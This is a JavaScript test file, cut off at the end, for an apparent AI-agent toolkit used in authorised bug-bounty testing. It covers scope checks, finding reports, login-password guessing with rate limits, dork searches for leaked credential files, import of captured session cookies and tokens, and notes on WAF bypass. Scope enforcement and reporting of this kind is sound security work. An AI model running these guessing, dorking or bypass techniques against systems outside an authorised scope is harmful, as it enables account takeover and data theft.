  await h.run("src_add_goal", { target: "example.test", objective: "g", authorization: "t" }, parent);
  await h.run("src_add_intent", { title: "recon", goalId: "goal-1" }, parent);
  await assert.rejects(() => h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }], allowIncomplete: true }, parent), /allowIncompleteReason/);
  await assert.rejects(() => h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }], allowIncomplete: true, allowIncompleteReason: "   " }, parent), /allowIncompleteReason/);
  const ok = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }], allowIncomplete: true, allowIncompleteReason: "WAF 全程拦截，用户指示停止" }, parent);
  assert.equal(ok.ready, true);
  assert.match(ok.warnings.join(" "), /受限完成/);
  const report = await h.run("src_report", {}, parent);
  assert.match(report.markdown, /受限完成声明[\s\S]*WAF 全程拦截，用户指示停止/);
});

test("legacy src_record_recon/src_record_asset_observation events still replay in projection after tool removal", () => {
  const h = harness();
  assert.equal(h.tools.has("src_record_recon"), false);
  assert.equal(h.tools.has("src_record_asset_observation"), false);
  const projection = h.projections.get("src");
  const call = (state, name, args) => projection.apply(state, { type: "tool/call", data: { name, arguments: JSON.stringify(args) } });
  let state = projection.init();
  state = call(state, "src_add_goal", { target: "example.test", objective: "test", authorization: "ticket" });
  state = call(state, "src_add_intent", { title: "recon", detail: "", goalId: "goal-1" });
  state = call(state, "src_record_recon", { intentId: "intent-1", source: "crt.sh", method: "passive", assets: [{ type: "subdomain", value: "api.example.test" }], facts: [{ kind: "info", detail: "wildcard cert" }] });
  state = call(state, "src_record_asset_observation", { intentId: "intent-1", type: "subdomain", value: "vpn.example.test", source: "DNS", method: "passive", confidence: 0.9, status: "candidate" });
  const view = projection.view(state);
  assert.equal(view.assets.some((a) => a.value === "api.example.test"), true);
  assert.equal(view.assets.some((a) => a.value === "vpn.example.test"), true);
});


test("finalize downgrades info/low-only findings to warning (SRC accepts real-harm low findings)", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "找到真实危害漏洞", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "audit", detail: "x", goalId: "goal-1" }, parent);
  await h.run("src_update_intent", { intentId: "intent-1", status: "completed" }, parent);
  const factEvidence1 = (await h.run("src_add_fact", { intentId: "intent-1", kind: "http", detail: "GET / => VAppServer/6.0.0 banner", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", { intentId: "intent-1", title: "版本指纹泄露", severity: "low", impact: "暴露版本号，可匹配已知 CVE 定向利用", affectedScope: "全站", remediation: "隐藏版本", pocEvidence: ["GET / => VAppServer/6.0.0"], reproducibleSteps: ["GET /"], victimImpact: "运维与用户均无感知地暴露后端框架与版本信息，攻击者可据此检索匹配的已知漏洞发起定向利用", attackPrerequisites: "仅需网络可达目标首页，无需登录或任何用户交互", concreteLossEvidence: [factEvidence1] }, parent);
  await h.run("src_record_research", { intentId: "intent-1", category: "info-leak", hypothesis: "版本泄露", status: "verified", findingId: "finding-1" }, parent);
  // rawRequest 门禁仍会阻断；但「仅 info/low」不再是 blocker，降级为 warning
  const result = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
  assert.equal(result.ready, false);
  assert.equal(result.blockers.some((b) => /真实危害|info\/low/.test(b)), false);
  assert.match(result.warnings.join(" "), /仅存在 low 级 finding/);
});

test("src_test_credential performs bounded credential verification and records hit", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "认证验证", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "弱口令", goalId: "goal-1" }, parent);
  await h.run("src_record_research", { intentId: "intent-1", category: "credential-test", hypothesis: "初始密码规则可命中", status: "hypothesis" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async (url, init) => {
      const body = new URLSearchParams(init.body);
      const ok = body.get("password") === "Lzit@19991234";
      return new Response(ok ? "欢迎登录" : "密码错误", { status: ok ? 200 : 200, headers: { "content-type": "text/html; charset=utf-8" } });
    };
    const result = await h.run("src_test_credential", {
      intentId: "intent-1", loginUrl: "https://example.test/login", username: "student001",
      candidates: ["123456", "Lzit@19991234", "admin1"], dictionarySource: "初始密码规则 Lzit@身份证后8位", rps: 0.5
    }, parent);
    assert.equal(result.hit, true);
    assert.equal(result.triedCount, 2);
    assert.equal(result.requiresDecision, false);
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.facts.some((f) => /凭据命中/.test(f.detail)), true);
    assert.equal(state.coverage.some((c) => c.phase === "credential-test" && c.status === "completed"), true);
  } finally { globalThis.fetch = originalFetch; }
});

test("src_test_credential stops on captcha unless bypass noted", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "认证验证", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "弱口令", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async () => new Response('<div>请输入图形验证码 captcha</div>', { status: 200, headers: { "content-type": "text/html" } });
    const result = await h.run("src_test_credential", {
      intentId: "intent-1", loginUrl: "https://example.test/login", username: "student001", candidates: ["123456"], dictionarySource: "默认密码"
    }, parent);
    assert.equal(result.requiresDecision, true);
    assert.equal(result.stopReason, "captcha-detected-unverifiable");
  } finally { globalThis.fetch = originalFetch; }
});

test("src_record_observation and src_user_todo lifecycle", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "时间线", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "探测", goalId: "goal-1" }, parent);
  const obs = await h.run("src_record_observation", { intentId: "intent-1", path: "/admin", httpStatus: 403, protectionSignal: true, source: "scan", decision: "UA变换绕过成功" }, parent);
  assert.equal(obs.protectionSignal, true);
  const todo = await h.run("src_user_todo", { title: "提供已登录 Burp 请求", kind: "auth-session", detail: "在 Burp 代理下登录后导出任意一条请求" }, parent);
  assert.equal(todo.status, "pending");
  const done = await h.run("src_user_todo", { userTodoId: todo.id, title: "提供已登录 Burp 请求", status: "done", note: "已导出发你" }, parent);
  assert.equal(done.status, "done");
  assert.equal(done.note, "已导出发你");
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.counts.observations, 1);
  assert.equal(state.counts.userTodos, 1);
  assert.equal(state.userTodos[0].status, "done");
});

test("src_collect_dorks generates five-category queries and records facts", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "dorks", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "dorks侦察", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async () => new Response('<a class="result__a" href="https://github.com/x/y/blob/main/.env">github.com/x/y .env leak</a>', { status: 200, headers: { "content-type": "text/html" } });
    const result = await h.run("src_collect_dorks", { intentId: "intent-1", domain: "example.test" }, parent);
    assert.equal(result.queries >= 15, true);
    assert.equal(result.fetched, 6);
    assert.equal(result.facts, result.queries);
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.facts.some((f) => /dorks\[credential\] 查询/.test(f.detail)), true);
    assert.equal(state.facts.some((f) => /dorks\[credential\] 命中.*github\.com/.test(f.detail)), true);
    assert.equal(state.coverage.some((c) => c.category === "dorks" && c.status === "completed"), true);
  } finally { globalThis.fetch = originalFetch; }
});

test("src_collect_dorks rejects out-of-scope domains", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "dorks", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "dorks侦察", goalId: "goal-1" }, parent);
  await assert.rejects(() => h.run("src_collect_dorks", { intentId: "intent-1", domain: "evil-elsewhere.com" }, parent), /outside the authorized goal host/);
});

test("src_import_traffic parses HAR, records full auth profiles and skips out-of-scope", async () => {
  const h = harness();
  const parentEvents = [];
  h.sessions.set("p", { append(type, data) { parentEvents.push({ type, data }); } });
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "导入", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "流量导入", goalId: "goal-1" }, parent);
  const har = { log: { entries: [
    { request: { method: "GET", url: "https://app.example.test/resume?page=2", headers: [{ name: "Cookie", value: "SESSION=abcdef123456; Path=/" }] }, response: { status: 200, headers: [{ name: "Content-Type", value: "text/html" }], content: { text: "<html>简历页</html>" } } },
    { request: { method: "POST", url: "https://evil-elsewhere.com/x", headers: [] }, response: { status: 200, headers: [], content: { text: "" } } }
  ] } };
  const result = await h.run("src_import_traffic", { intentId: "intent-1", mode: "har", data: JSON.stringify(har), authProfileNote: "学生账号 student001 已授权" }, parent);
  assert.equal(result.observations, 1);
  assert.equal(parentEvents.some((e) => e.type === "tool/call" && e.data.name === "src_record_observation"), true);
  assert.equal(result.outOfScope, 1);
  assert.equal(result.authFacts, 1);
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.observations.some((o) => o.path === "/resume?page=2" && o.httpStatus === 200), true);
  assert.equal(state.assets.some((a) => a.type === "endpoint" && a.value === "app.example.test/resume"), true);
  const authFact = state.facts.find((f) => f.kind === "auth-profile" && /cookie/i.test(f.detail));
  assert.ok(authFact, "auth fact recorded");
  assert.match(authFact.detail, /SESSION=abcdef123456/);
});

test("src_import_traffic mcp mode consumes pre-fetched flows", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "导入", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "流量导入", goalId: "goal-1" }, parent);
  const result = await h.run("src_import_traffic", { intentId: "intent-1", mode: "mcp", flows: [{ method: "GET", url: "https://example.test/api/user", status: 200, reqHeaders: "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9xyz", respHeaders: "Content-Type: application/json", body: "{\"id\":1}" }] }, parent);
  assert.equal(result.observations, 1);
  assert.equal(result.authFacts, 1);
  const state = await h.run("src_state", {}, parent);
  const mcpObs = state.observations.find((o) => o.source === "burp-mcp");
  assert.ok(mcpObs, "burp-mcp observation recorded");
  const authFact = state.facts.find((f) => f.kind === "auth-profile" && /authorization/i.test(f.detail));
  assert.ok(authFact, "auth fact recorded");
  assert.match(authFact.detail, /Bearer eyJhbGciOiJIUzI1NiJ9xyz/);
});

test("报告输出 7 字段含 entryPoint/discoveryPath/raw 请求/响应 + finalize rawRequest 门禁", async () => {
  const h = harness();
  // 门禁部分：缺 rawRequest 被 finalize 拦截
  const p1 = h.exec("gate");
  await h.run("src_add_goal", { target: "https://app.example.test", objective: "门禁", authorization: "SRC" }, p1);
  await h.run("src_add_intent", { title: "越权", goalId: "goal-1" }, p1);
  await h.run("src_update_intent", { intentId: "intent-1", status: "completed" }, p1);
  const factEvidence2 = (await h.run("src_add_fact", { intentId: "intent-1", kind: "http", detail: "GET /resume?id=2 -> 200 他人姓名电话", confidence: 0.9 }, p1)).id;
  await h.run("src_add_finding", { intentId: "intent-1", title: "越权读取简历", severity: "high", impact: "泄露", affectedScope: "全站", remediation: "鉴权", pocEvidence: ["GET /resume?id=2 -> 200"], reproducibleSteps: ["GET /resume?id=2"], victimImpact: "任意求职者的姓名电话邮箱可被陌生人批量读取，存在诈骗骚扰风险且无从察觉", attackPrerequisites: "攻击者仅需注册普通账号并遍历简历 ID，无管理权限", concreteLossEvidence: [factEvidence2] }, p1);
  await h.run("src_record_research", { intentId: "intent-1", category: "authorization-bypass", hypothesis: "id 越权", status: "verified", findingId: "finding-1" }, p1);
  const blocked = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, p1);
  assert.equal(blocked.ready, false);
  assert.equal(blocked.blockers.some((b) => /rawRequest/.test(b)), true);
  // 通过部分：独立 session，带全字段
  const p2 = h.exec("full");
  await h.run("src_add_goal", { target: "https://app.example.test", objective: "通过", authorization: "SRC" }, p2);
  await h.run("src_add_intent", { title: "越权", goalId: "goal-1" }, p2);
  await h.run("src_update_intent", { intentId: "intent-1", status: "completed" }, p2);
  const factEvidence3 = (await h.run("src_add_fact", { intentId: "intent-1", kind: "http", detail: "GET /resume?id=2 -> 200 {\"id\":2,\"name\":\"他人\"}", confidence: 0.9 }, p2)).id;
  await h.run("src_add_finding", { intentId: "intent-1", title: "越权读取他人简历", severity: "high", impact: "任意学生简历泄露", affectedScope: "全站学生", remediation: "后端鉴权", pocEvidence: ["GET /resume?id=2 -> 200"], reproducibleSteps: ["GET /resume?id=2"], entryPoint: "简历查看页-详情", discoveryPath: "Burp proxy history 导入 app.example.test/api/resume", rawRequest: "GET /resume?id=2 HTTP/1.1\r\nHost: app.example.test\r\nCookie: SESSION=x\r\n\r\n", rawResponse: "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"id\":2,\"name\":\"他人\"}", victimImpact: "任意学生的简历隐私数据被陌生人读取，存在被诈骗与骚扰风险且无从察觉", attackPrerequisites: "攻击者仅需普通账号并遍历简历 ID，无管理权限", concreteLossEvidence: [factEvidence3] }, p2);
  await h.run("src_record_research", { intentId: "intent-1", category: "authorization-bypass", hypothesis: "id 越权", status: "verified", findingId: "finding-1" }, p2);
  const ok = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, p2);
  assert.equal(ok.ready, true);
  const report = await h.run("src_report", {}, p2);
  assert.match(report.markdown, /前端功能点：简历查看页-详情/);
  assert.match(report.markdown, /① 发现：Burp proxy history/);
  assert.match(report.markdown, /=== Request ===/);
  assert.match(report.markdown, /GET \/resume\?id=2 HTTP\/1\.1/);
  assert.match(report.markdown, /=== Response ===/);
});

test("src_collect_passive 识别 AI 站点并落 ai-surface 资产 + 研究骨架", async () => {
  const h = harness();
  const parent = h.exec("ai");
  await h.run("src_add_goal", { target: "https://ai.example.test", objective: "AI 面收集", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "被动侦察", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    let call = 0;
    globalThis.fetch = async (url) => {
      const p = new URL(url).pathname;
      call++;
      if (p === "/" && call <= 2) return new Response("<html><title>AI 助手 powered by deepseek</title>大模型对话</html>", { status: 200, headers: { "content-type": "text/html" } });
      return new Response("", { status: 404, headers: { "content-type": "text/plain" } });
    };
    const result = await h.run("src_collect_passive", { intentId: "intent-1", baseUrl: "https://ai.example.test", hostnames: ["ai.example.test"], maxHints: 5 }, parent);
    assert.equal(result.requiresDecision, false);
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.assets.some((a) => a.type === "ai-surface" && a.value === "https://ai.example.test"), true);
    assert.equal(state.research.some((r) => r.category === "ai-abuse" && r.status === "hypothesis"), true);
  } finally { globalThis.fetch = originalFetch; }
});

test("checkpoint 记录 decision 决策理由（时间线决策字段）", async () => {
  const h = harness();
  h.sessions.set("pdec", { append() {} });
  const parent = h.exec("pdec");
  const child = h.exec("cdec", "pdec");
  await h.run("src_add_goal", { target: "https://example.test", objective: "决策", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "越权", goalId: "goal-1" }, parent);
  const result = await h.run("src_submit", { intentId: "intent-1", stage: "blocked", summary: "WAF 拦截需绕过", facts: [{ kind: "http", target: "https://example.test", detail: "/admin 403", confidence: 0.7 }], assets: [], findings: [], decision: "撞 WAF 403，拟先做 UA 变体绕过试探再决定" }, child);
  assert.equal(result.duplicateCheckpoint, false);
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.checkpoints[0].decision, "撞 WAF 403，拟先做 UA 变体绕过试探再决定");
});

test("projection 回放 observation/user_todo 并在 view 输出（UI 数据面）", async () => {
  const h = harness();
  const parent = h.exec("pproj");
  await h.run("src_add_goal", { target: "https://example.test", objective: "投影", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "侦察", goalId: "goal-1" }, parent);
  await h.run("src_record_observation", { intentId: "intent-1", method: "GET", path: "/admin", httpStatus: 403, protectionSignal: true, wafBypassed: false, source: "scan", decision: "WAF 拦截" }, parent);
  const todo = await h.run("src_user_todo", { title: "提供已登录 Burp 请求", detail: "登录态获取", kind: "auth-session" }, parent);
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.observations.length, 1);
  assert.equal(state.userTodos.length, 1);
  // 折叠面单测：fold 工具事件后 view 应输出 observations/userTodos（UI 数据面）
  const mod = await import("../lib/src.js");
  let st = JSON.parse(JSON.stringify(mod.srcInitialState));
  st = { ...st, goal: { id: "goal-1", target: "https://example.test", objective: "投影", authorization: "SRC" } };
  const call = (name, args) => mod.applySrcEvent(st, { type: "tool/call", data: { name, arguments: JSON.stringify(args) } });
  st = call("src_add_intent", { title: "侦察", goalId: "goal-1" });
  st = call("src_record_observation", { intentId: "intent-1", method: "GET", path: "/admin", httpStatus: 403, protectionSignal: true, source: "scan", decision: "WAF 拦截" });
  st = call("src_user_todo", { title: "提供已登录 Burp 请求", detail: "登录态获取", kind: "auth-session" });
  const proj = mod.viewSrcState(st);
  assert.equal(proj.observations.length, 1);
  assert.equal(proj.userTodos.length, 1);
  assert.equal(proj.counts.observations, 1);
});

/* [local.33] fold：src_auth_budget 权威计数落 state；非法参数忽略；src_add_goal 保留会话级预算。 */
test("[local.33] fold src_auth_budget：计数落 state，非法参数忽略，跨 goal 保留", async () => {
  const mod = await import("../lib/src.js");
  let st = JSON.parse(JSON.stringify(mod.srcInitialState));
  const call = (name, args) => { st = mod.applySrcEvent(st, { type: "tool/call", data: { name, arguments: JSON.stringify(args) } }); };
  call("src_add_goal", { target: "example.test", objective: "预算" });
  call("src_auth_budget", { used: 7, limit: 30 });
  let view = mod.viewSrcState(st);
  assert.equal(view.authBudget.used, 7);
  assert.equal(view.authBudget.limit, 30);
  call("src_auth_budget", { used: -5, limit: 30 });
  call("src_auth_budget", { used: "x", limit: 0 });
  assert.equal(mod.viewSrcState(st).authBudget.used, 7, "非法 used/limit 不污染");
  call("src_auth_budget", { used: 9, limit: 30 });
  call("src_add_goal", { target: "other.test", objective: "重开" });
  view = mod.viewSrcState(st);
  assert.equal(view.authBudget.used, 9, "src_add_goal 保留会话级认证预算");
  assert.equal(view.domainNotes.length, 0, "域笔记随 goal 重置，等快照事件重建");
});

/* [local.33] fold：src_domain_notes_snapshot 整表替换 + 脏行过滤。 */
test("[local.33] fold src_domain_notes_snapshot：快照替换 domainNotes，脏行过滤", async () => {
  const mod = await import("../lib/src.js");
  let st = JSON.parse(JSON.stringify(mod.srcInitialState));
  const call = (name, args) => { st = mod.applySrcEvent(st, { type: "tool/call", data: { name, arguments: JSON.stringify(args) } }); };
  call("src_add_goal", { target: "example.test", objective: "笔记" });
  call("src_domain_notes_snapshot", { notes: [
    { id: "domainNote-1", category: "pitfall", title: "api/v1 限流", content: "burst 会 429", sourceSessionId: "s1", createdAt: 1, updatedAt: 2 },
    { id: "", title: "脏行缺 id" },
    null,
    { id: "domainNote-2", title: "缺类别默认 misc" },
    { id: "domainNote-3" }
  ] });
  const view = mod.viewSrcState(st);
  assert.equal(view.domainNotes.length, 2);
  assert.equal(view.domainNotes[0].content, "burst 会 429");
  assert.equal(view.domainNotes[1].category, "misc");
  assert.equal(view.counts.domainNotes, 2);
});

test("/src-todo feedback parser validates id/status and keeps note", () => {
	const good = parseTodoFeedback(" todo-2   done 已用 Burp 抓包 ");
	assert.equal(good.ok, true);
	assert.equal(good.userTodoId, "todo-2");
	assert.equal(good.status, "done");
	assert.equal(good.note, "已用 Burp 抓包");
	const reopened = parseTodoFeedback("todo-3 pending");
	assert.equal(reopened.ok, true);
	assert.equal(reopened.note, "");
	for (const [input, reason] of [
		["", "缺少参数"],
		["todo-x done", "不合法"],
		["todo-1 finished", "必须是"]
	]) {
		const bad = parseTodoFeedback(input);
		assert.equal(bad.ok, false);
		assert.match(bad.error, new RegExp(reason));
	}
});

test("[local.26] /src-reject panel command: validates findingId/reason and relays to agent via followup (mirror of /src-todo)", async () => {
  const h = harness();
  assert.equal(h.commands.has("src-reject"), true, "src-reject registered");

  const parent = h.exec("prej");
  let followed = null;
  parent.agent.followup = (message) => { followed = message; };

  // happy path: findingId + reason -> success + followup instructing src_reject_finding
  const ok = await h.commands.get("src-reject").handler({ rawInput: "finding-2 危害链不闭合，请补 attackChain", agent: parent.agent });
  assert.equal(ok.kind, "success");
  assert.ok(followed, "must followup to the agent");
  const text = followed.content[0].text;
  assert.match(text, /src_reject_finding/);
  assert.match(text, /finding-2/);
  assert.match(text, /危害链不闭合，请补 attackChain/);

  // missing reason -> error, no followup
  followed = null;
  const noReason = await h.commands.get("src-reject").handler({ rawInput: "finding-3", agent: parent.agent });
  assert.equal(noReason.kind, "error");
  assert.match(noReason.text, /缺少打回理由/);
  assert.equal(followed, null, "missing reason must not wake the agent");

  // illegal finding id -> error
  const badId = await h.commands.get("src-reject").handler({ rawInput: "find-3 理由", agent: parent.agent });
  assert.equal(badId.kind, "error");
  assert.match(badId.text, /不合法/);

  // overlong reason (>500) -> error
  const longReason = await h.commands.get("src-reject").handler({ rawInput: `finding-3 ${"x".repeat(501)}`, agent: parent.agent });
  assert.equal(longReason.kind, "error");
  assert.match(longReason.text, /过长|上限 500/);
});

test("[local.9] parseGoalHost: dirty target normalized at src_add_goal and all URL tools", async () => {
  const h = harness();
  const parent = h.exec("p");
  const goal = await h.run("src_add_goal", { target: "mi.com（小米在线服务主域，含 *.mi.com 子域）", objective: "脏目标归一化" }, parent);
  assert.equal(goal.target, "mi.com");
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.goal.target, "mi.com");
});

test("[local.9] parseGoalHost rejects unparseable targets with actionable error; src_set_goal_target fixes in place", async () => {
  const h = harness();
  const parent = h.exec("p9b");
  await assert.rejects(() => h.run("src_add_goal", { target: "！！！不是���名", objective: "x" }, parent), /不是可测的公网目标/);
  /* [local.22] 纯 ASCII 品牌名（OPPO）不再被 URL 解析误判为单标签 hostname "oppo"。 */
  await assert.rejects(() => h.run("src_add_goal", { target: "OPPO", objective: "x" }, parent), /不是可测的公网目标/);
  const goal = await h.run("src_add_goal", { target: "example.test", objective: "fix-target" }, parent);
  await h.run("src_add_intent", { title: "i1", goalId: goal.id }, parent);
  const updated = await h.run("src_set_goal_target", { target: "sub.example.test（主域）" }, parent);
  assert.equal(updated.target, "sub.example.test");
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.goal.target, "sub.example.test");
  assert.equal(state.counts.intents, 1, "graph NOT reset by target fix");
});

test("[local.9] src_record_coverage treats empty assetId as absent instead of throwing", async () => {
  const h = harness();
  const parent = h.exec("p9c");
  await h.run("src_add_goal", { target: "example.test", objective: "cov" }, parent);
  const record = await h.run("src_record_coverage", { assetId: "", phase: "recon", category: "dorks", status: "completed" }, parent);
  assert.ok(record.id);
  const state = await h.run("src_state", {}, parent);
  const row = state.coverage.find((c) => c.category === "dorks");
  assert.ok(row, "coverage row recorded");
});

test("[local.9] src_state output includes observations/userTodos/infra without schema rejection", async () => {
  const h = harness();
  const parent = h.exec("p9d");
  await h.run("src_add_goal", { target: "example.test", objective: "schema" }, parent);
  await h.run("src_user_todo", { title: "登录 example.test 提供会话", kind: "auth-session" }, parent);
  const state = await h.run("src_state", {}, parent);
  assert.equal(Array.isArray(state.observations), true);
  assert.equal(Array.isArray(state.userTodos), true);
  assert.equal(state.userTodos.length, 1);
  assert.equal(typeof state.infra.proxyUrl, "string");
});

test("[local.9] infra settings: defaults, setInfra validation, projection fold and view resolution", async () => {
  const h = harness();
  const parent = h.exec("p9e");
  await h.run("src_add_goal", { target: "example.test", objective: "infra" }, parent);
  const before = await h.run("src_get_infra", {}, parent);
  assert.equal(before.infra.burpMcpPort, "9876");
  await assert.rejects(() => h.run("src_set_infra", { key: "nope", value: "1" }, parent), /key 必须是/);
  await assert.rejects(() => h.run("src_set_infra", { key: "proxyUrl", value: "not-a-proxy" }, parent), /proxyUrl 格式/);
  const saved = await h.run("src_set_infra", { key: "testPhone", value: "13800138000" }, parent);
  assert.equal(saved.value, "13800138000");
  // [local.10] testPhone accepts a comma-separated list; garbage still rejected
  const multi = await h.run("src_set_infra", { key: "testPhone", value: "13800138000，13900139000 15012345678" }, parent);
  assert.equal(multi.value, "13800138000，13900139000 15012345678");
  await assert.rejects(() => h.run("src_set_infra", { key: "testPhone", value: "13800138000,abc" }, parent), /多个用逗号分隔/);
  const after = await h.run("src_get_infra", {}, parent);
  assert.equal(after.infra.testPhone, "13800138000，13900139000 15012345678");
  assert.equal(after.processEnvProxy !== void 0, true);

  // clearing an override restores the built-in default
  await h.run("src_set_infra", { key: "burpMcpPort", value: "" }, parent);
  const cleared = await h.run("src_get_infra", {}, parent);
  assert.equal(cleared.infra.burpMcpPort, "9876", "cleared override must fall back to default");

  // projection: synthesize the same tool-call events and check resolved view
  let state = JSON.parse(JSON.stringify(srcInitialState));
  state = applySrcEvent(state, { type: "tool/call", data: { name: "src_add_goal", arguments: JSON.stringify({ target: "example.test", objective: "infra" }) } });
  state = applySrcEvent(state, { type: "tool/call", data: { name: "src_set_infra", arguments: JSON.stringify({ key: "testPhone", value: "13800138000" }) } });
  const view = viewSrcState(state);
  assert.equal(view.infra.testPhone, "13800138000");
  assert.equal(view.infra.burpMcpPort, "9876");
  // infra survives a goal reset in the projection
  state = applySrcEvent(state, { type: "tool/call", data: { name: "src_add_goal", arguments: JSON.stringify({ target: "other.test", objective: "reset" }) } });
  assert.equal(viewSrcState(state).infra.testPhone, "13800138000");
});

test("observation projection carries truncated response headers/snippet for the timeline", () => {
	let state = JSON.parse(JSON.stringify(srcInitialState));
	state = { ...state, goal: { id: "goal-1", target: "https://x.test", objective: "t", authorization: "SRC" } };
	state = { ...state, nodes: [...state.nodes, { id: "intent-1", kind: "intent", title: "i", detail: "d", status: "running", createdAt: 1 }] };
	state = applySrcEvent(state, { type: "tool/call", data: { name: "src_record_observation", arguments: JSON.stringify({
		intentId: "intent-1",
		assetId: "asset-9",
		method: "GET",
		path: "/admin",
		httpStatus: 403,
		respHeaders: "S".repeat(2000),
		respBodySnippet: "B".repeat(5000),
		protectionSignal: true,
		source: "burp-mcp",
		decision: "waf-blocked"
	}) } });
	const view = viewSrcState(state);
	const obs = view.observations.find((row) => row.path === "/admin");
	assert.ok(obs, "observation in view");
	assert.equal(obs.assetId, "asset-9");
	assert.equal(obs.respHeaders.length, 600);
	assert.equal(obs.respBodySnippet.length, 1200);
	assert.equal(obs.decision, "waf-blocked");
});


test("[local.11] panel commands: /src-infra direct-writes storage + synthetic event; probes registered; burp TCP pre-check gates the AI relay", async () => {
  const h = harness();
  for (const name of ["src-todo", "src-reject", "src-infra", "src-proxy-test", "src-burp-test"]) assert.equal(h.commands.has(name), true, `${name} registered`);

  // --- /src-infra: direct write, no followup, synthetic tool/call appended ---
  const parent = h.exec("pcmd");
  let followed = null;
  parent.agent.followup = (message) => { followed = message; };
  const saved = await h.commands.get("src-infra").handler({ rawInput: "testPhone 13800138000,13900139000", agent: parent.agent });
  assert.equal(saved.kind, "success");
  assert.equal(followed, null, "/src-infra must NOT wake the agent");
  const sessionLog = h.sessions.get("pcmd").events;
  const callEvents = sessionLog.filter((event) => event.type === "tool/call");
  assert.equal(callEvents.length, 1, "synthetic tool/call appended exactly once");
  assert.deepEqual(callEvents[0].data, { name: "src_set_infra", arguments: JSON.stringify({ key: "testPhone", value: "13800138000,13900139000" }) });
  const infraAfter = await h.run("src_get_infra", {}, parent);
  assert.equal(infraAfter.infra.testPhone, "13800138000,13900139000", "direct write landed in storage");

  // projection fold sees the synthetic event too (goal first: viewSrcState needs a goal)
  let state = JSON.parse(JSON.stringify(srcInitialState));
  state = applySrcEvent(state, { type: "tool/call", data: { name: "src_add_goal", arguments: JSON.stringify({ target: "example.test", objective: "cmd" }) } });
  state = applySrcEvent(state, { type: "tool/call", data: callEvents[0].data });
  assert.equal(viewSrcState(state).infra.testPhone, "13800138000,13900139000");

  // clearing via "-" restores default and still appends the event
  followed = null;
  sessionLog.length = 0;
  const cleared = await h.commands.get("src-infra").handler({ rawInput: "testPhone -", agent: parent.agent });
  assert.equal(cleared.kind, "success");
  assert.equal(followed, null);
  assert.equal((await h.run("src_get_infra", {}, parent)).infra.testPhone, "");

  // unknown key -> error text
  const bad = await h.commands.get("src-infra").handler({ rawInput: "nope x", agent: parent.agent });
  assert.equal(bad.kind, "error");

  // --- /src-burp-test with nothing listening on the configured port -> direct error, no AI ---
